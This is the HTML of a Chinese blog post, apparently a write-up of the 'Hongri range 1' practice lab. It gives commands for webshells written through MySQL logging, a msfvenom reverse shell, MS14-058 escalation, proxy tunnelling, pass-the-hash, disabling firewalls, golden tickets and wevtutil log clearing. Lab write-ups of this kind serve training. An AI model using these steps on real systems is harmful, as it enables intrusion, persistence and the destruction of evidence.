@@ -1,0 +1,288 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日靶场1 | 红烧花园宝宝</title><meta name="author" content="红烧花园宝宝"><meta name="copyright" content="红烧花园宝宝"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言靶场来自无境，尽量写的详细一点 过程web渗透-sql日志首页![[imgs/6b27b675526db8ea7e46ea680b266191_MD5.png|591]]使用tscan进行目录扫描![[imgs/e49e101fdd68c4bf2a7fa592d283d7a0_MD5.png|384]]访问phpMyAdmin后台，root/rootshow va">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日靶场1">
+<meta property="og:url" content="https://lxu2n.github.io/posts/6fe81bcd/index.html">
+<meta property="og:site_name" content="红烧花园宝宝">
+<meta property="og:description" content="前言靶场来自无境，尽量写的详细一点 过程web渗透-sql日志首页![[imgs/6b27b675526db8ea7e46ea680b266191_MD5.png|591]]使用tscan进行目录扫描![[imgs/e49e101fdd68c4bf2a7fa592d283d7a0_MD5.png|384]]访问phpMyAdmin后台，root/rootshow va">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lxu2n.github.io/image/1.png">
+<meta property="article:published_time" content="2026-06-16T08:52:44.000Z">
+<meta property="article:modified_time" content="2026-06-16T08:54:24.626Z">
+<meta property="article:author" content="红烧花园宝宝">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lxu2n.github.io/image/1.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "红日靶场1",
+  "url": "https://lxu2n.github.io/posts/6fe81bcd/",
+  "image": "https://lxu2n.github.io/image/1.png",
+  "datePublished": "2026-06-16T08:52:44.000Z",
+  "dateModified": "2026-06-16T08:54:24.626Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "红烧花园宝宝",
+      "url": "https://lxu2n.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/image/6.png"><link rel="canonical" href="https://lxu2n.github.io/posts/6fe81bcd/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日靶场1',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script></head><body><canvas id="bubble_canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;pointer-events:none"></canvas><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/modify.css"><link rel="stylesheet" href="/styles/main.css"><script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script><meta name="generator" content="Hexo 7.3.0"><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (false) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(https://lxu2n.github.io/image/2.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><!-- 左侧博客信息区域--><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/image/6.png" alt="Logo"><span class="site-name">红烧花园宝宝</span></a><a class="nav-page-title" href="/"><span class="site-name">红日靶场1</span></a></span><!-- 新增的导航菜单容器（居中布局关键）--><div id="nav-menus-container"><!-- 菜单主体部分--><div id="menus"><!-- 菜单项--><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><!-- 右侧功能区域（新增容器）--><div id="nav-right-container"><!-- 搜索按钮（移动到右侧）--><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><!-- 移动端汉堡菜单按钮--><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">红日靶场1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-16T08:52:44.000Z" title="发表于 2026-06-16 16:52:44">2026-06-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-16T08:54:24.626Z" title="更新于 2026-06-16 16:54:24">2026-06-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%89%93%E9%9D%B6/">打靶</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>靶场来自无境，尽量写的详细一点</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><h2 id="web渗透-sql日志"><a href="#web渗透-sql日志" class="headerlink" title="web渗透-sql日志"></a>web渗透-sql日志</h2><p>首页<br>![[imgs/6b27b675526db8ea7e46ea680b266191_MD5.png|591]]<br>使用tscan进行目录扫描<br>![[imgs/e49e101fdd68c4bf2a7fa592d283d7a0_MD5.png|384]]<br>访问phpMyAdmin后台，root/root<br><code>show variables like '%general%'</code><br>![[imgs/00b627eb7728e49bbbd22f476d19e625_MD5.png|564]]<br>这里显示的日志的开关以及日志存放的位置<br>我们要做的事将一句话代码写进shell.php中，将日志开关打开，然后改变日志存储的文件位置<br><code>set global general_log = "on"</code><br><code>set global general_log_file = "C:\\phpStudy\\WWW\\shell.php"</code><br>![[imgs/0b1b0aa7febdadc8c85c243642aaa9db_MD5.png|574]]<br>然后使用蚁剑连接；<br>![[imgs/e685cc6c794af07ddd699faed3495408_MD5.png|673]]</p>
+<h2 id="web渗透-YXcms"><a href="#web渗透-YXcms" class="headerlink" title="web渗透-YXcms"></a>web渗透-YXcms</h2><p>这个是在目录是在御剑里扫描出来的<br><code>http://192.168.111.20/yxcms/index.php/</code><br>![[imgs/2c4dfa2bd2507ec0363400c1e6b5a6ae_MD5.png|574]]<br>尝试登录<br>这里的模板文件是可以编辑的，我们写入一句话木马。<br>![[imgs/f5740a111c70683efebc743299aaba4f_MD5.png|574]]<br>继续扫描发现目标文件<br><code>http://192.168.111.20/yxcms/protected/apps/default/view/default/info.php</code><br>![[imgs/c96c9e317d5626a50c261612c7e1b5b8_MD5.png|574]]</p>
+<h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><p>接着我们上线msf<br>生成木马<br><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.111.25 LPORT=5566 -f exe -o stageless.exe</code><br>然后配置好后run</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"># 切换为无阶段 Payload</span><br><span class="line">set PAYLOAD windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set LHOST 192.168.111.25</span><br><span class="line">set LPORT 5566</span><br><span class="line">set ReverseListenerBindAddress 0.0.0.0</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+<p>![[imgs/ce9b6b565958e6f31bce47cfbd7c39c5_MD5.png|574]]<br>使用蚁剑上传木马执行<br>![[imgs/ba23521536f6f2b9a93cb78802b2fc5e_MD5.png|574]]<br>getshell<br>然后我们判断一下是否在域内</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ipconfig /all</span><br><span class="line">systeminfo</span><br></pre></td></tr></tbody></table></figure>
+<p>![[imgs/44557ebfb596a2874813a3ebe5953148_MD5.png|538]]<br>![[imgs/c2893edee40c6623e83aa7bf0ff18ba2_MD5.png|260]]<br>这里我们在上线一下cs，因为无境的靶场只能一台机器连接vpn，这里我是只用kali来做的<br>客户端cs启动命令：<br><code>java -Dfile.encoding=UTF-8 -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Duser.language=en -javaagent:uHook.jar -jar cobaltstrike-client.jar $* </code><br>![[imgs/6c5e549038097d8a90ab3d56b756b081_MD5.png|697]]<br>到这里我们cs和msf都能上线了，但是这个环境和正常的环境有点不同，这里需要使用ms14-058提权，那么我们在msf里进行操作。<br>拿到meterpreter之后</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use exploit/windows/local/ms14_058_track_popup_menu</span><br><span class="line">set SESSION 1</span><br><span class="line">set TARGET 1</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.111.25</span><br><span class="line">set ReverseListenerBindAddress 0.0.0.0</span><br><span class="line">set LPORT 5555</span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/posts/6fe81bcd/20260613194947624.png" alt="image.png"><br>ok，这里把system上线一下cs<br><img src="/posts/6fe81bcd/20260613195936133.png" alt="image.png"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group "domain admins" /domain  # 查看域管理员的名字</span><br><span class="line">net group "domain computers" /domain  # 查看域中的其他主机名</span><br><span class="line">net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></tbody></table></figure>
+<p>这里我们所在的域名已经知道了<br>接着看一下有几个域<br><img src="/posts/6fe81bcd/20260613200624920.png" alt="image.png"><br>看一下域内的主机<br><img src="/posts/6fe81bcd/20260613201308536.png" alt="image.png"><br>查询域内ip，使用arp -a查询<br><img src="/posts/6fe81bcd/20260613201536087.png" alt="image.png"><br>看一下域控可以通过ping域名的方式<br><img src="/posts/6fe81bcd/20260613203113123.png" alt="image.png"></p>
+<p><img src="/posts/6fe81bcd/20260613203204385.png" alt="image.png"></p>
+<p><img src="/posts/6fe81bcd/20260613203257036.png" alt="image.png"><br>小总结一下：<br>192.168.52.141 域名：ROOT-TVI862UBEH.god.org<br>192.168.111.20 域名：STU1.god.org<br>192.168.52.138 域控：owa.god.org</p>
+<h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>正常我们将木马文件执行之后，会在靶机的任务列表中产生一个进程，权限维持就是将这个进程寄生在另一个进程之上，这样不容易被发现<br><img src="/posts/6fe81bcd/20260613204336963.png" alt="image.png"><br>getpid看一下当前进程是3544<br>我们要维持这个权限<br>ps看一下进程<br><img src="/posts/6fe81bcd/20260613204542210.png" alt="image.png"><br>我们把它移到3400下<br><code>migrate 3400</code><br><img src="/posts/6fe81bcd/20260613204648672.png" alt="image.png"><br>这样就成功了，如果不知道要迁移到那个进程可以使用<code>run post/windows/manage/migrate</code>,系统会自动寻找指定进程进行迁移。</p>
+<h3 id="内网横向"><a href="#内网横向" class="headerlink" title="内网横向"></a>内网横向</h3><p>横向这里使用stowaway做一个代理<br><img src="/posts/6fe81bcd/20260613205342627.png" alt="image.png"><br><code>./linux_x64_admin -l 9999</code><br>启动服务端<br><code>C:\Users\Public\windows_x64_agent.exe -c 192.168.111.25:9999</code><br><img src="/posts/6fe81bcd/20260613205734166.png" alt="image.png"><br>转发流量到服务端<br>然后服务端转发到本地<br><img src="/posts/6fe81bcd/20260613205852290.png" alt="image.png"><br>138的<br><img src="/posts/6fe81bcd/20260613211911286.png" alt="image.png"><br>这里扫描的太慢了，懒得等了<br>直接放大佬们的扫描结果了<br>141的<br><img src="/posts/6fe81bcd/20260613212103103.png" alt="image.png"><br>138是有一个445端口开放的，可以试一下永恒之蓝漏洞</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set RHOSTS 192.168.52.138</span><br><span class="line"></span><br><span class="line">set LHOST 192.168.111.25</span><br><span class="line">set LPORT 9998</span><br><span class="line"></span><br><span class="line">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="/posts/6fe81bcd/20260613212931679.png" alt="image.png"><br>没有成功</p>
+<h3 id="pth拿下域控"><a href="#pth拿下域控" class="headerlink" title="pth拿下域控"></a>pth拿下域控</h3><p>PTH就是运行攻击着在不知道目标机器账号密码的情况下，直接利用提取到的用户密码hash值（NLTM Hash）去对机器中的其他机器进行身份验证。<br>所以这里我们已经对system上线到了cs中，直接用cs内置插件抓取明文密码试试<br><img src="/posts/6fe81bcd/20260616155726761.png" alt="image.png|601"><br>这里可以看到NTLM，在msf中使用哈希传递</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/admin/smb/psexec_command  #在目标机器上执行系统命令</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/psexec          #用psexec执行系统命令</span><br><span class="line"></span><br><span class="line">exploit/windows/smb/psexec_psh       #使用powershell作为payload</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.52.138</span><br><span class="line">set smbuser administrator</span><br><span class="line">set smbpass 00000000000000000000000000000000:933a9b5b44dab4530d86d83a6b47b7d1</span><br><span class="line">set smbdomain god</span><br><span class="line">run</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>寄</p>
+<h4 id="cs横向"><a href="#cs横向" class="headerlink" title="cs横向"></a>cs横向</h4><p>接下来尝试cs<br><code>shell netsh advfirewall set allprofiles state off</code><br>先关闭防火墙<br>刚刚我们在端口扫描的时候发现445端口开放，所以可以创建SMB监听隧道。</p>
+<ol>
+<li>SMB监听隧道的核心原理是利用SMB协议在目标主机上建立隐蔽的通信通道，绕过传统防火墙和入侵检测系统的监控。</li>
+<li>SMB协议基础：文件共享，域名解析等，默认通过445端口通信<br>创建SMB监听器<br><img src="/posts/6fe81bcd/20260616162553966.png" alt="image.png"><br>然后（这里要先扫描一下端口）<br><img src="/posts/6fe81bcd/20260616162627865.png" alt="image.png"><br>使用psexec横向移动<br><img src="/posts/6fe81bcd/20260616162707235.png" alt="image.png"><br>最后配置好<br><img src="/posts/6fe81bcd/20260616162955970.png" alt="image.png"><br>launch之后<br><img src="/posts/6fe81bcd/20260616163053210.png" alt="image.png"><br>横向成功<br><code>shell netsh advfirewall set allprofiles state off</code><br>关闭防火墙</li>
+</ol>
+<h3 id="权限维持（黄金票据）"><a href="#权限维持（黄金票据）" class="headerlink" title="权限维持（黄金票据）"></a>权限维持（黄金票据）</h3><p>黄金票据是指能够绕过认证授权机制并获得所需权限的票据。<br>收集信息<br>hash，SID，域名<br><img src="/posts/6fe81bcd/20260616163611361.png" alt="image.png"><br>hash<br><code>58e91a5ac358d86513ab224312314061:::</code><br><img src="/posts/6fe81bcd/20260616164012857.png" alt="image.png"><br><code>S-1-5-20</code><br><img src="/posts/6fe81bcd/20260616164308104.png" alt="image.png|642"><br>写入之后<br><img src="/posts/6fe81bcd/20260616164331032.png" alt="image.png|593"><br>成功登录<br><img src="/posts/6fe81bcd/20260616164412200.png" alt="image.png|572"></p>
+<h3 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell wevtutil cl security               //清理安全日志</span><br><span class="line">shell wevtutil cl system                 //清理系统日志</span><br><span class="line">shell wevtutil cl application            //清理应用程序日志</span><br><span class="line">shell wevtutil cl "windows powershell"   //清除power shell日志</span><br><span class="line">shell wevtutil cl Setup                  //清除（cl）事件日志中的 "Setup" 事件。</span><br></pre></td></tr></tbody></table></figure>
+<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><p><img src="/posts/6fe81bcd/20260616165036324.png" alt="image.png"></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Afa1rs/p/18870098">ATT&amp;CK实战系列(一)红日靶场1 - Afa1rs - 博客园</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/6fe81bcd/">https://lxu2n.github.io/posts/6fe81bcd/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/posts/7ca98e62/" title="java代码审计之sql注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">java代码审计之sql注入</div></div><div class="info-2"><div class="info-item-1">前言最近在疯狂打游戏哈，有点懈怠了，所以赶紧去来补一下java的代码审计，上一篇的xss是找了个视频，随便写了点，这个就认真一点，依旧找个博客跟着大佬学习。项目地址：JoyChou93/java-sec-code: Java web common vulnerabilities and security code which is base on springboot and spring security jdbc的拼接不当导致的sql注入在jdbc中存在两个sql语句来执行sql，一个是Statement，另一个是PreparedStatement。那么他们的写法分别是 Statement1234Connection con = DriverManager.getConnection(url, user, password);Statement statement = con.createStatement();String sql = "select * from users where username = '" + usernam...</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">61</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F-sql%E6%97%A5%E5%BF%97"><span class="toc-number">2.1.</span> <span class="toc-text">web渗透-sql日志</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F-YXcms"><span class="toc-number">2.2.</span> <span class="toc-text">web渗透-YXcms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.3.</span> <span class="toc-text">后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-number">2.3.1.</span> <span class="toc-text">前期准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.3.2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">2.3.3.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91"><span class="toc-number">2.3.4.</span> <span class="toc-text">内网横向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pth%E6%8B%BF%E4%B8%8B%E5%9F%9F%E6%8E%A7"><span class="toc-number">2.3.5.</span> <span class="toc-text">pth拿下域控</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cs%E6%A8%AA%E5%90%91"><span class="toc-number">2.3.5.1.</span> <span class="toc-text">cs横向</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%EF%BC%88%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%EF%BC%89"><span class="toc-number">2.3.6.</span> <span 